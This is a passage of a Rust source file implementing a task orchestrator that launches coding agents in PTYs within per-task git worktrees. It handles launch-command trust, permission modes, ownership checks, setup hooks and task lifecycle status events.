//! Task orchestrator. Owns the lifecycle of an agent run:
//!
//!   1. Resolve the agent's command template + interpolate vars.
//!   2. Create the per-task git worktree on a deterministic `phasr/*` branch.
//!   3. Spawn the PTY in that worktree, transition to `running`.
//!   4. Watch the PTY's exit event and flip the row to
//!      `completed` / `failed` once it fires.
//!   5. Expose `stop` (SIGINT, then SIGTERM after 3s) and
//!      `send_input` for the interactive terminal.
//!
//! The orchestrator is *Tauri-agnostic*: it exposes status changes via
//! a `tokio::broadcast` channel. The command layer subscribes and
//! re-emits onto Tauri's event bus.
//!
//! Naming bridge: the orchestrator's public API uses **task** vocabulary
//! to match the plan and user-facing UI. The persistence layer renamed
//! `tasks` to `workspaces` in migration 0002; we keep the orchestrator
//! talking to `WorkspaceRepo` under the hood but expose `task_id` in
//! the API so the React side can use the same noun everywhere.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use chrono::{DateTime, Utc};
use serde::Serialize;
use tokio::sync::broadcast;

use crate::agent_signals::{AgentSignals, AttentionResponse, LaunchTask};
use crate::domain::repository_config::validate_branch_name;
use crate::domain::{Agent, PermissionMode, Repository, Workspace, WorkspaceKind, WorkspaceStatus};
use crate::git;
use crate::pty::handle::PtyHandle;
use crate::pty::{PtyEvent, SpawnSpec, TaskRuntime};
use crate::store::{LocalTaskClaim, RepositoryRepo, WorkspaceRepo, WorkspaceUpdate};

use super::error::OrchestratorError;
use super::launch::{interpolate_for_task, RunIn};
use super::repo_locks::RepoLockRegistry;
use super::setup::{self, SetupLog, TaskConfig, TaskSetup};

/// How long we wait for SIGINT to gracefully shut a process down
/// before escalating to SIGKILL (via portable_pty's killer).
const SIGINT_GRACE: Duration = Duration::from_secs(3);
/// Per step of the SIGHUP → SIGTERM → SIGKILL escalation on stop.
const TERMINATE_GRACE: Duration = Duration::from_secs(2);

/// Pause between the keystrokes of a multi-key attention answer: long
/// enough for an Ink TUI to process (and re-render) one key before the
/// next arrives in a separate read.
const KEYSTROKE_GAP: Duration = Duration::from_millis(150);

/// Capacity for the status-event broadcast channel. Status events are
/// rare (a few per task lifecycle) and consumers re-emit them onto
/// Tauri events, so a small buffer is plenty.
const STATUS_BROADCAST_CAPACITY: usize = 256;

/// Fired whenever a task row transitions to a new status. Subscribers
/// (the Tauri command layer, the sync worker) re-emit / persist as
/// they see fit.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskStatusEvent {
    pub task_id: String,
    pub repository_id: String,
    pub status: WorkspaceStatus,
    pub exit_code: Option<i64>,
}

#[derive(Debug, Clone)]
pub struct StartTaskRequest {
    pub repository_id: String,
    /// The signed-in user the workspace belongs to. Required for the row
    /// to be picked up by cloud sync (`dirty_workspace_rows` filters on
    /// `user_id`). `None` only in tests, which run without a session.
    pub user_id: Option<String>,
    /// The agent recorded on the workspace (metadata).
    pub agent: Agent,
    /// The command to actually run. In production this is
    /// `launch::resolve_launch(agent, mode, settings)`, resolved by the
    /// command layer; kept separate so tests can substitute a fast-exiting
    /// command.
    pub command: String,
    pub name: String,
    pub prompt: Option<String>,
    pub base_branch: Option<String>,
    pub rows: Option<u16>,
    pub cols: Option<u16>,
    /// Recorded on the row; the flags themselves are already in `command`.
    /// `None` only from tests that predate permission modes.
    pub permission_mode: Option<PermissionMode>,
    pub notify_on_attention: bool,
    pub run_in: RunIn,
}

/// A task row to save without starting it (`TaskOrchestrator::create_row`),
/// and the shared shape `start_task` builds its row from.
#[derive(Debug, Clone)]
pub struct TaskRow {
    pub repository_id: String,
    pub agent: Agent,
    /// Resolved launch template; `{{prompt}}` is filled when the row is built.
    pub command: String,
    pub name: String,
    pub prompt: Option<String>,
    /// `None` → the repository's default branch, read at launch.
    pub base_branch: Option<String>,
    pub permission_mode: Option<PermissionMode>,
    pub notify_on_attention: bool,
    pub queued: bool,
    pub depends_on: Option<String>,
}

/// Edits to a not-yet-launched task. `None` = leave as is; for the
/// clearable fields `Some(None)` clears.
#[derive(Debug, Clone, Default)]
pub struct TaskRowPatch {
    pub name: Option<String>,
    pub prompt: Option<Option<String>>,
    pub agent: Option<Agent>,
    /// New launch template (re-resolved by the caller for the new agent /
    /// mode); `{{prompt}}` is re-filled with the final prompt.
    pub command: Option<String>,
    pub permission_mode: Option<PermissionMode>,
    pub notify_on_attention: Option<bool>,
    pub base_branch: Option<Option<String>>,
    pub queued: Option<bool>,
    pub depends_on: Option<Option<String>>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StartedTask {
    pub task_id: String,
    pub workspace: Workspace,
}

/// What `start_task` hands back: the row as it is when the call returns,
/// and the setup + agent spawn it left running in the background (`None`
/// when there's nothing to wait for: an in-place start, which is already
/// running, or a duplicate that returned another start's row).
pub struct TaskStart {
    pub started: StartedTask,
    pub launch: Option<tokio::task::JoinHandle<Result<StartedTask, OrchestratorError>>>,
}

impl TaskStart {
    /// The task once its background launch has finished: running, or the
    /// error that marked it `failed`. Without a launch, the row as returned.
    pub async fn launched(self) -> Result<StartedTask, OrchestratorError> {
        match self.launch {
            Some(handle) => handle.await.unwrap_or_else(|err| {
                Err(git::GitError::CommandFailed(format!("task setup stopped: {err}")).into())
            }),
            None => Ok(self.started),
        }
    }
}

pub struct TaskTerminalSubscription {
    pub task_id: String,
    pub started_at: DateTime<Utc>,
    pub replay: Vec<PtyEvent>,
    pub rx: broadcast::Receiver<PtyEvent>,
}

/// The orchestrator itself. Hand it the dependencies it needs and call
/// `start_task` / `stop_task` / `send_input`.
#[derive(Clone)]
pub struct TaskOrchestrator {
    workspaces: WorkspaceRepo,
    repositories: RepositoryRepo,
    runtime: Arc<TaskRuntime>,
    repo_locks: Arc<RepoLockRegistry>,
    status_tx: broadcast::Sender<TaskStatusEvent>,
    /// `task_id → user_id` pairs `assert_owner` has already confirmed
    /// against the store. Positive-only and never needs invalidating for
    /// correctness: a workspace's owner never changes (adoption only fills
    /// a NULL owner in), and a deleted workspace has no PTY left to
    /// address. Exists because `send_input_to_task` runs per keystroke and
    /// must not pay a SQLite round-trip each time.
    verified_owners: Arc<parking_lot::Mutex<HashMap<String, String>>>,
    /// Needs-you / usage tracking. `None` in tests that don't exercise it;
    /// every agent launch then runs exactly the stored command.
    signals: Option<AgentSignals>,
    /// Settings + repository rules (branch template, worktree base, copy /
    /// hook / fetch, shell, API keys). `None` in tests: built-in behaviour.
    task_config: Option<TaskConfig>,
    /// Tasks `launch` / `start_task` are setting up right now (fetch,
    /// worktree, copy, after-create hook — up to minutes) before their
    /// agent spawns. Such a row is `pending`, with no branch until its
    /// worktree is cut; without this set it looked like a draft, and "Start
    /// now" + opening its terminal spawned the agent while the hook still
    /// ran, then the launch's own spawn failed and marked the live agent
    /// exited. In memory on purpose: no new `WorkspaceStatus` (older
    /// clients can't parse one), and an app quit mid-setup leaves nothing
    /// stale behind.
    starting: Arc<parking_lot::Mutex<HashSet<String>>>,
    /// Per-task lock around "is a PTY live? → spawn one", so concurrent
    /// opens of one task attach to a single agent instead of racing two
    /// registrations and spawns.
    spawn_locks: Arc<parking_lot::Mutex<HashMap<String, Arc<tokio::sync::Mutex<()>>>>>,
}

/// Removes a task from `TaskOrchestrator::starting` when setup ends —
/// whichever way it ends (success, error, a dropped future).
struct StartingGuard {
    starting: Arc<parking_lot::Mutex<HashSet<String>>>,
    signals: Option<AgentSignals>,
    task_id: String,
}

impl Drop for StartingGuard {
    fn drop(&mut self) {
        self.starting.lock().remove(&self.task_id);
        if let Some(signals) = &self.signals {
            signals.clear_starting(&self.task_id);
        }
    }
}

/// The command a launch/resume types, and whether the row's permission
/// mode was not honoured (see `launch_command`).
struct LaunchCommand {
    command: Option<String>,
    mode_downgraded: bool,
}

/// What actually gets typed into a fresh agent PTY.
struct AgentLaunch {
    command: Option<String>,
    prompt: Option<String>,
    env: Vec<(String, String)>,
    /// Registration with `AgentSignals`, to attach the PTY to.
    generation: Option<u64>,
    /// `user_settings.terminal_shell`, when usable on this machine.
    shell: Option<String>,
}

impl TaskOrchestrator {
    /// `repo_locks` is passed in (rather than created here) so the same
    /// registry is shared with the command layer via Tauri `State` —
    /// `create_workspace`, `merge_to_main`, and `delete_workspace` must
    /// serialize their shared-`.git` mutations against the same locks
    /// this orchestrator uses for `git worktree add` (F6).
    pub fn new(
        workspaces: WorkspaceRepo,
        repositories: RepositoryRepo,
        runtime: Arc<TaskRuntime>,
        repo_locks: Arc<RepoLockRegistry>,
    ) -> Self {
        let (status_tx, _rx) = broadcast::channel(STATUS_BROADCAST_CAPACITY);
        Self {
            workspaces,
            repositories,
            runtime,
            repo_locks,
            status_tx,
            verified_owners: Arc::new(parking_lot::Mutex::new(HashMap::new())),
            signals: None,
            task_config: None,
            starting: Arc::new(parking_lot::Mutex::new(HashSet::new())),
            spawn_locks: Arc::new(parking_lot::Mutex::new(HashMap::new())),
        }
    }

    /// Claim `task_id` as being set up. `None` if it already is: someone
    /// else's launch owns it, and a second start must not run.
    fn begin_starting(&self, task_id: &str, repository_id: &str) -> Option<StartingGuard> {
        if !self.starting.lock().insert(task_id.to_string()) {
            return None;
        }
        if let Some(signals) = &self.signals {
            signals.mark_starting(task_id, repository_id);
        }
        Some(StartingGuard {
            starting: self.starting.clone(),
            signals: self.signals.clone(),
            task_id: task_id.to_string(),
        })
    }

    /// Whether `task_id` is being set up to launch right now.
    pub fn is_starting(&self, task_id: &str) -> bool {
        self.starting.lock().contains(task_id)
    }

    fn spawn_lock(&self, task_id: &str) -> Arc<tokio::sync::Mutex<()>> {
        self.spawn_locks
            .lock()
            .entry(task_id.to_string())
            .or_default()
            .clone()
    }

    /// What `task_id`'s agent is doing (`None` = not tracked here).
    pub fn agent_phase(&self, task_id: &str) -> Option<crate::domain::board::AgentPhase> {
        self.signals.as_ref().and_then(|s| s.phase(task_id))
    }

    /// Record that `task_id`'s permission mode was chosen on THIS machine
    /// (see `launch::trust_task_mode`). No-op without a trust store.
    async fn trust_mode_here(&self, task_id: &str, mode: Option<PermissionMode>) {
        if let (Some(meta), Some(mode)) =
            (self.task_config.as_ref().and_then(TaskConfig::trust), mode)
        {
            if let Err(err) = super::launch::trust_task_mode(meta, task_id, mode).await {
                eprintln!("failed to record the permission mode of task {task_id}: {err}");
            }
        }
    }

    /// The command a launch or resume of `workspace` types.
    ///
    /// Never the stored `workspaces.command`: that column syncs, so it may
    /// have been written on another machine (or by anyone holding the
    /// account) — and the agent's API key from this machine's Keychain is
    /// in the environment it runs with. Instead it is rebuilt from THIS
    /// machine's trusted template for the agent (`settings_trust::usable`),
    /// the permission mode and the prompt. A `skip-all` mode is honoured
    /// only if it was chosen on this machine (`launch::effective_mode`);
    /// otherwise the machine's default mode is used. A row without an
    /// agent runs nothing (a plain shell).
    ///
    /// Without a trust store (tests), the stored command runs as is.
    async fn launch_command(
        &self,
        workspace: &Workspace,
    ) -> Result<LaunchCommand, OrchestratorError> {
        let Some(meta) = self.task_config.as_ref().and_then(TaskConfig::trust) else {
            let stored = workspace.command.trim();
            return Ok(LaunchCommand {
                command: (!stored.is_empty()).then(|| workspace.command.clone()),
                mode_downgraded: false,
            });
        };
        let Some(agent) = workspace.agent else {
            return Ok(LaunchCommand {
                command: None,
                mode_downgraded: false,
            });
        };
        let setup = self.setup_for(&workspace.repository_id).await;
        let set_here =
            super::launch::is_task_mode_trusted(meta, &workspace.id, workspace.permission_mode)
                .await;
        let (mode, mode_downgraded) = super::launch::effective_mode(
            agent,
            workspace.permission_mode,
            set_here,
            &setup.settings,
        );
        let template = super::launch::resolve_command(agent, mode, &setup.settings)?;
        Ok(LaunchCommand {
            command: Some(interpolate_for_task(&template, workspace.prompt.as_deref())),
            mode_downgraded,
        })
    }

    /// Read settings + repository rules for every launch (see `setup`).
    pub fn with_task_config(mut self, config: TaskConfig) -> Self {
        self.task_config = Some(config);
        self
    }

    async fn setup_for(&self, repository_id: &str) -> TaskSetup {
        match &self.task_config {
            Some(config) => config.setup_for(repository_id).await,
            None => TaskSetup::defaults(repository_id),
        }
    }

    /// Track agent state/usage for every task this orchestrator launches,
    /// and add the hook-bridge extras to their launch commands.
    pub fn with_agent_signals(mut self, signals: AgentSignals) -> Self {
        self.signals = Some(signals);
        self
    }

    /// Resolve the line to type for `workspace`'s agent: hook extras, and on
    /// `resuming`, the CLI's resume syntax instead of re-sending the prompt.
    /// Registers the task with `AgentSignals` (before the spawn, so a hook
    /// that fires during boot finds it).
    async fn agent_launch(
        &self,
        workspace: &Workspace,
        command: Option<String>,
        prompt: Option<String>,
        cwd: &Path,
        resuming: bool,
    ) -> AgentLaunch {
        let setup = self.setup_for(&workspace.repository_id).await;
        let shell = setup.shell();
        // The agent's own API key (Keychain), and only its own.
        let key_env = match (&self.task_config, workspace.agent) {
            (Some(config), Some(agent)) => config.api_env(agent).await,
            _ => Vec::new(),
        };
        let (Some(signals), Some(agent), Some(stored)) =
            (self.signals.as_ref(), workspace.agent, command.clone())
        else {
            // Without signals: still never type a prompt the command line
            // already carries.
            let embeds = command.as_deref().is_some_and(|c| {
                crate::agent_signals::launch::command_embeds_prompt(c, prompt.as_deref())
            });
            return AgentLaunch {
                prompt: if embeds { None } else { prompt },
                command,
                env: key_env,
                generation: None,
                shell,
            };
        };
        let target = signals.target_for(workspace);
        let plan = signals
            .prepare_launch(&LaunchTask {
                task_id: workspace.id.clone(),
                agent,
                command: stored,
                prompt: prompt.clone(),
                resuming,
                target: target.clone().unwrap_or_else(|| {
                    crate::agent_signals::transcripts::TranscriptTarget {
                        agent,
                        cwd: cwd.to_path_buf(),
                        since: None,
                        session_ids: Vec::new(),
                        shared_cwd: workspace.workspace_kind == WorkspaceKind::Local,
                    }
                }),
                policy: setup.policy(),
            })
            .await;
        let generation = signals.register_task(workspace, agent, cwd, target);
        let mut env = plan.env;
        env.extend(key_env);
        AgentLaunch {
            command: Some(plan.command),
            prompt: if plan.send_prompt { prompt } else { None },
            env,
            generation: Some(generation),
            shell,
        }
    }

    /// Spawn a task PTY for `launch`, and hand it to `AgentSignals`.
    fn spawn_agent_pty(
        &self,
        task_id: &str,
        cwd: PathBuf,
        launch: AgentLaunch,
        rows: u16,
        cols: u16,
    ) -> Result<Arc<PtyHandle>, OrchestratorError> {
        // Only a launch that types a prompt needs the gate; it must exist
        // before the spawn, since the writer thread starts with the PTY.
        let gate = match (&self.signals, launch.generation, &launch.prompt) {
            (Some(signals), Some(generation), Some(_)) => signals.prompt_gate(task_id, generation),
            _ => None,
        };
        let mut spec = SpawnSpec::new(task_id, cwd)
            .with_initial_command(launch.command)
            .with_initial_prompt(launch.prompt)
            .with_prompt_gate(gate)
            .with_shell(launch.shell)
            .with_size(rows, cols);
        for (key, value) in launch.env {
            spec = spec.with_env(key, value);
        }
        let handle = match self.runtime.spawn(spec) {
            Ok(handle) => handle,
            // Another PTY owns the task: its agent is alive. Marking it
            // exited would hide a running agent (and its dialogs).
            Err(err @ crate::pty::handle::PtyError::AlreadyRunning) => return Err(err.into()),
            Err(err) => {
                if let Some(signals) = &self.signals {
                    signals.mark_exited(task_id);
                }
                return Err(err.into());
            }
        };
        if let (Some(signals), Some(generation)) = (&self.signals, launch.generation) {
            signals.attach_pty(task_id, generation, &handle);
        }
        Ok(handle)
    }

    /// `Ok` only if `task_id` is a live workspace owned by `user_id`.
    /// Another account's task is `not found`, exactly like a missing one.
    ///
    /// Every PTY command keyed by a task id calls this first. Task ids here
    /// are always workspace ids: run-command (`run:<id>`) and ad-hoc
    /// session (`session:<uuid>`) PTYs have their own commands and never
    /// reach the orchestrator.
    pub async fn assert_owner(
        &self,
        task_id: &str,
        user_id: &str,
    ) -> Result<(), OrchestratorError> {
        if self
            .verified_owners
            .lock()
            .get(task_id)
            .is_some_and(|owner| owner == user_id)
        {
            return Ok(());
        }
        self.workspaces.get_for_user(task_id, user_id).await?;
        self.verified_owners
            .lock()
            .insert(task_id.to_string(), user_id.to_string());
        Ok(())
    }

    pub fn subscribe_status(&self) -> broadcast::Receiver<TaskStatusEvent> {
        self.status_tx.subscribe()
    }

    /// `(task_id, last-output wall-clock ms)` for every task with a live
    /// PTY. Tasks whose PTY has exited are absent, not zero.
    pub fn task_activity(&self) -> Vec<(String, i64)> {
        self.runtime.activity()
    }

    /// The repository a task is created in, owner-scoped when there's a
    /// session (unscoped only on the sessionless test path), and its
    /// checkout — which must exist and be a git repository.
    async fn task_repository(
        &self,
        repository_id: &str,
        user_id: Option<&str>,
    ) -> Result<(Repository, PathBuf), OrchestratorError> {
        let repository = match user_id {
            Some(user_id) => {
                self.repositories
                    .get_for_user(repository_id, user_id)
                    .await?
            }
            None => self.repositories.get(repository_id).await?,
        };
        let repository_path = repository
            .local_path
            .as_deref()
            .map(PathBuf::from)
            .ok_or(OrchestratorError::RepositoryHasNoLocalPath)?;
        if !repository_path.exists() {
            return Err(OrchestratorError::RepositoryPathMissing(
                repository_path.to_string_lossy().into_owned(),
            ));
        }
        if !repository_path.join(".git").exists() {
            return Err(OrchestratorError::RepositoryNotAGitRepo(
                repository_path.to_string_lossy().into_owned(),
            ));
        }
        Ok((repository, repository_path))
    }

    async fn get_task(
        &self,
        task_id: &str,
        user_id: Option<&str>,
    ) -> Result<Workspace, OrchestratorError> {
        Ok(match user_id {
            Some(user_id) => self.workspaces.get_for_user(task_id, user_id).await?,
            None => self.workspaces.get(task_id).await?,
        })
    }

    /// Cut the task's branch (from the branch template) at `start_point`
    /// into a fresh worktree under the resolved base, and record branch +
    /// path + base on `workspace`. `base` is what the task merges into and
    /// diffs against; `start_point` is where it forks — `origin/<base>`
    /// after a fresh fetch, else `base` itself. Caller holds the repo lock
    /// (`git worktree add` races on the shared `.git`).
    ///
    /// On the blocking pool: on a large repository `git worktree add` is a
    /// full checkout (~35s on servo), and run on a Tokio worker it stalled
    /// every other IPC call sharing that worker.
    async fn cut_worktree(
        repository_path: &Path,
        workspace: &mut Workspace,
        base: &str,
        start_point: &str,
        setup: &TaskSetup,
    ) -> Result<PathBuf, OrchestratorError> {
        let worktree_path = setup.worktree_base().join(&workspace.id);
        let (setup, repo, name, id, agent, worktree, start_point) = (
            setup.clone(),
            repository_path.to_path_buf(),
            workspace.name.clone(),
            workspace.id.clone(),
            workspace.agent,
            worktree_path.clone(),
            start_point.to_string(),
        );
        let branch = blocking_git(move || {
            // `unique_branch_name` shells out too.
            let branch = setup.branch_for(&repo, &name, &id, agent);
            git::create_worktree(&repo, &worktree, &branch, &start_point)?;
            Ok(branch)
        })
        .await?;
        workspace.branch = Some(branch);
        workspace.worktree_path = Some(worktree_path.to_string_lossy().into_owned());
        workspace.base_branch = Some(base.to_string());
        Ok(worktree_path)
    }

    /// Steps 1 of the setup order (see `setup`): fetch the base when the
    /// repository asks for it. Returns the start point.
    async fn start_point(
        &self,
        repository_path: &Path,
        base: &str,
        setup: &TaskSetup,
        log: &mut SetupLog,
    ) -> String {
        if setup.config.fetch_base_before_task {
            setup::fetch_base(repository_path, base, log).await
        } else {
            base.to_string()
        }
    }

    /// Steps 3–4: copy untracked files into the new worktree, then run the
    /// after-create hook once. Both log to the task log; neither fails the
    /// start.
    async fn prepare_worktree(
        &self,
        task_id: &str,
        repository_path: &Path,
        worktree: &Path,
        setup: &TaskSetup,
        mut log: SetupLog,
    ) {
        if !setup.config.copy_untracked_globs.is_empty() {
            let (repo, wt, globs) = (
                repository_path.to_path_buf(),
                worktree.to_path_buf(),
                setup.config.copy_untracked_globs.clone(),
            );
            let copied =
                tokio::task::spawn_blocking(move || setup::copy_untracked(&repo, &wt, &globs))
                    .await
                    .unwrap_or_default();
            if !copied.is_empty() {
                log.push(format!(
                    "phasr: copied into the worktree: {}",
                    copied.join(", ")
                ));
            }
        }
        if let Some(hook) = setup.config.after_create_hook() {
            let shell = setup.shell();
            setup::run_after_create_hook(worktree, hook, shell.as_deref(), &mut log).await;
        }
        log.flush(&self.runtime.log_dir, task_id);
    }

    /// Create a task row and return it at once; its setup (fetch, worktree,
    /// copy, after-create hook) and the agent spawn run in the background
    /// (`TaskStart::launch`), exactly as `launch` does for a draft.
    ///
    /// On a large repository that setup takes tens of seconds (a full
    /// checkout) to minutes (the hook); done inside the IPC call it left the
    /// New task dialog on "Starting…" with no feedback. Now the row exists
    /// immediately, claimed as starting: the board shows it Running with
    /// "Setting up the worktree…", and its terminal says it is being set up
    /// until the agent spawns. A setup that fails marks the row `failed`
    /// with the reason in its log (`fail_start`) — a failed start is a
    /// visible, closable task, not a vanished one.
    ///
    /// What can be known up front stays a synchronous error: the
    /// repository, the base branch name.
    pub async fn start_task(
        &self,
        request: StartTaskRequest,
    ) -> Result<TaskStart, OrchestratorError> {
        let (repository, repository_path) = self
            .task_repository(&request.repository_id, request.user_id.as_deref())
            .await?;

        if request.run_in == RunIn::InPlace {
            let started = self
                .start_in_place(request, &repository, repository_path)
                .await?;
            return Ok(TaskStart {
                started,
                launch: None,
            });
        }

        let setup = self.setup_for(&request.repository_id).await;
        let base = setup.base_branch(request.base_branch.as_deref(), &repository.default_branch);
        validate_branch_name(&base).map_err(OrchestratorError::InvalidBaseBranch)?;

        // The lock is taken *before* the duplicate check so check → claim →
        // row-insert is atomic per repo. That's what makes start_task
        // idempotent (task #12, the durable server-side twin of the D1
        // client re-entrancy guard): a rapid duplicate / replayed IPC /
        // second window blocks here, then finds the row this call inserted
        // and returns it — instead of minting a SECOND task_id/branch/
        // worktree/agent.
        let lock = self.repo_locks.for_repository(&request.repository_id);
        let guard = lock.lock().await;

        if let Some(existing) = self
            .find_active_start(&request.repository_id, &request.name, request.user_id.as_deref())
            .await?
        {
            return Ok(TaskStart {
                started: StartedTask {
                    task_id: existing.id.clone(),
                    workspace: existing,
                },
                launch: None,
            });
        }

        let workspace = Self::new_task_row(TaskRow {
            repository_id: request.repository_id.clone(),
            agent: request.agent,
            command: request.command,
            name: request.name,
            prompt: request.prompt,
            // Resolved now (the repository's rule or default), so the
            // background launch cuts from what was asked for.
            base_branch: Some(base),
            permission_mode: request.permission_mode,
            notify_on_attention: request.notify_on_attention,
            queued: false,
            depends_on: None,
        });
        // Claimed before the row exists and held until the agent spawns or
        // the start fails: the row is `pending` without a branch until its
        // worktree is cut, and unclaimed it would read as a Draft ("Start
        // now") and `open_terminal` would say it hasn't started.
        let starting = self
            .begin_starting(&workspace.id, &workspace.repository_id)
            .ok_or(OrchestratorError::Starting)?;

        // Stamp the owner so cloud sync picks the row up. Without a
        // user_id the workspace stays local-only forever.
        match request.user_id.as_deref() {
            Some(user_id) => self.workspaces.insert_for_user(&workspace, user_id).await?,
            None => self.workspaces.insert(&workspace).await?,
        }
        self.trust_mode_here(&workspace.id, workspace.permission_mode)
            .await;
        drop(guard);

        // The board and sidebar pick the row up now, not when it runs.
        self.broadcast_status(TaskStatusEvent {
            task_id: workspace.id.clone(),
            repository_id: workspace.repository_id.clone(),
            status: workspace.status,
            exit_code: None,
        });

        let this = self.clone();
        let task_id = workspace.id.clone();
        let (user_id, rows, cols) = (request.user_id, request.rows, request.cols);
        let launch = tokio::spawn(async move {
            let launched = this
                .launch_claimed(&task_id, user_id.as_deref(), rows, cols, &starting)
                .await;
            if let Err(err) = &launched {
                eprintln!("[launch] task {task_id} failed to start: {err}");
                // Still claimed: the row never reads as a Draft in between.
                this.fail_start(&task_id, err).await;
            }
            drop(starting);
            launched
        });
        Ok(TaskStart {
            started: StartedTask {
                task_id: workspace.id.clone(),
                workspace,
            },
            launch: Some(launch),
        })
    }

    /// The ACTIVE start of `(repository_id, name)`, if any: a launched
    /// pending/running row, or one still being set up (no branch yet, so
    /// the store can't tell it from a draft — `starting` can). Bounded to
    /// active, launched tasks so a deliberate re-run after the first has
    /// stopped/completed/been deleted still starts fresh, and a same-named
    /// draft doesn't swallow the start. Owner-scoped when there's a user
    /// (production); unscoped only on the sessionless test path.
    async fn find_active_start(
        &self,
        repository_id: &str,
        name: &str,
        user_id: Option<&str>,
    ) -> Result<Option<Workspace>, OrchestratorError> {
        let launched = match user_id {
            Some(user_id) => {
                self.workspaces
                    .find_active_by_name_for_user(repository_id, name, user_id)
                    .await?
            }
            None => self.workspaces.find_active_by_name(repository_id, name).await?,
        };
        if launched.is_some() {
            return Ok(launched);
        }
        let ids: Vec<String> = self.starting.lock().iter().cloned().collect();
        for id in ids {
            let row = match self.get_task(&id, user_id).await {
                Ok(row) => row,
                Err(OrchestratorError::Store(crate::store::StoreError::NotFound)) => continue,
                Err(err) => return Err(err),
            };
            if row.repository_id == repository_id
                && row.name == name
                && row.workspace_kind == WorkspaceKind::Agent
                && row.status == WorkspaceStatus::Pending
            {
                return Ok(Some(row));
            }
        }
        Ok(None)
    }

    /// A background start (`start_task`) failed — fetch, worktree, spawn:
    /// the row becomes `failed` with the reason in its log (the session's
    /// log view shows it), and the status event raises the "task failed"
    /// notification. A row that moved on meanwhile — closed, archived,
    /// deleted, or running after all — is left alone.
    async fn fail_start(&self, task_id: &str, err: &OrchestratorError) {
        let Ok(current) = self.workspaces.get(task_id).await else {
            return;
        };
        if current.status != WorkspaceStatus::Pending
            || current.outcome.is_some()
            || self.runtime.get(task_id).is_some()
        {
            return;
        }
        let mut log = SetupLog::default();
        log.push(format!("phasr: couldn't start this task: {err}"));
        log.flush(&self.runtime.log_dir, task_id);
        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Failed),
                    finished_at: Some(Some(Utc::now())),
                    ..Default::default()
                },
            )
            .await;
        match updated {
            Ok(updated) => self.broadcast_status(TaskStatusEvent {
                task_id: task_id.to_string(),
                repository_id: updated.repository_id,
                status: WorkspaceStatus::Failed,
                exit_code: None,
            }),
            Err(err) => eprintln!("failed to mark task {task_id} failed: {err}"),
        }
    }

    fn new_task_row(row: TaskRow) -> Workspace {
        let command = interpolate_for_task(&row.command, row.prompt.as_deref());
        let mut workspace = Workspace::new(row.repository_id, row.name, command);
        workspace.prompt = row.prompt;
        workspace.agent = Some(row.agent);
        workspace.permission_mode = row.permission_mode;
        workspace.notify_on_attention = row.notify_on_attention;
        workspace.base_branch = row.base_branch;
        workspace.queued_at = row.queued.then(Utc::now);
        workspace.depends_on_workspace_id = row.depends_on;
        workspace
    }

    /// Save a task without starting it: a draft, or (`queued`) one the
    /// queue scheduler starts once its dependency is satisfied. No worktree
    /// yet — that's cut at `launch`, from the then-current base.
    pub async fn create_row(
        &self,
        row: TaskRow,
        user_id: Option<&str>,
    ) -> Result<Workspace, OrchestratorError> {
        let repository = match user_id {
            Some(user_id) => {
                self.repositories
                    .get_for_user(&row.repository_id, user_id)
                    .await?
            }
            None => self.repositories.get(&row.repository_id).await?,
        };
        if let Some(dependency) = row.depends_on.as_deref() {
            self.get_task(dependency, user_id)
                .await
                .map_err(|_| OrchestratorError::InvalidDependency(dependency.to_string()))?;
        }
        if let Some(base) = row.base_branch.as_deref() {
            validate_branch_name(base.trim()).map_err(OrchestratorError::InvalidBaseBranch)?;
        }
        let workspace = Self::new_task_row(row);
        match user_id {
            Some(user_id) => self.workspaces.insert_for_user(&workspace, user_id).await?,
            None => self.workspaces.insert(&workspace).await?,
        }
        // Created here: its mode is this machine's choice.
        self.trust_mode_here(&workspace.id, workspace.permission_mode)
            .await;
        self.broadcast_status(TaskStatusEvent {
            task_id: workspace.id.clone(),
            repository_id: repository.id,
            status: workspace.status,
            exit_code: None,
        });
        Ok(workspace)
    }

    /// Edit a task that hasn't started (draft or queued).
    pub async fn update_unlaunched(
        &self,
        task_id: &str,
        user_id: Option<&str>,
        patch: TaskRowPatch,
    ) -> Result<Workspace, OrchestratorError> {
        let current = self.get_task(task_id, user_id).await?;
        if !current.is_unlaunched() {
            return Err(OrchestratorError::AlreadyLaunched);
        }
        if let Some(Some(base)) = patch.base_branch.as_ref() {
            validate_branch_name(base.trim()).map_err(OrchestratorError::InvalidBaseBranch)?;
        }
        if let Some(Some(dependency)) = patch.depends_on.as_ref() {
            if dependency == task_id || self.depends_on_transitively(dependency, task_id).await {
                return Err(OrchestratorError::InvalidDependency(dependency.clone()));
            }
            self.get_task(dependency, user_id)
                .await
                .map_err(|_| OrchestratorError::InvalidDependency(dependency.clone()))?;
        }
        let prompt = patch.prompt.clone().unwrap_or(current.prompt.clone());
        // Only a mode this edit CHANGED is this machine's choice: an edit
        // of something else re-sends the stored (possibly synced) mode,
        // which must not be laundered into a trusted one.
        let mode_changed = patch
            .permission_mode
            .filter(|mode| current.permission_mode != Some(*mode));
        let updated = self
            .workspaces
            .update(
                task_id,
                WorkspaceUpdate {
                    name: patch.name,
                    prompt: patch.prompt,
                    agent: patch.agent.map(Some),
                    command: patch
                        .command
                        .map(|template| interpolate_for_task(&template, prompt.as_deref())),
                    permission_mode: patch.permission_mode.map(Some),
                    notify_on_attention: patch.notify_on_attention,
                    base_branch: patch.base_branch,
                    queued_at: patch.queued.map(|queued| queued.then(Utc::now)),
                    depends_on_workspace_id: patch.depends_on,
                    ..Default::default()
                },
            )
            .await?;
        if mode_changed.is_some() {
            self.trust_mode_here(task_id, mode_changed).await;
        }
        self.broadcast_status(TaskStatusEvent {
            task_id: updated.id.clone(),
            repository_id: updated.repository_id.clone(),
            status: updated.status,
            exit_code: None,
        });
        Ok(updated)
    }

    /// Whether `from`'s dependency chain reaches `target` (a cycle if
    /// `target` were made to depend on `from`). Bounded: chains are short,
    /// and a pre-existing cycle must not loop forever.
    async fn depends_on_transitively(&self, from: &str, target: &str) -> bool {
        let mut next = Some(from.to_string());
        for _ in 0..64 {
            let Some(id) = next.take() else {
                return false;
            };
            if id == target {
                return true;
            }
            next = self
                .workspaces
                .get(&id)
                .await
                .ok()
                .and_then(|w| w.depends_on_workspace_id);
        }
        true
    }

    /// Start a saved (draft or queued) task: cut its worktree from its base,
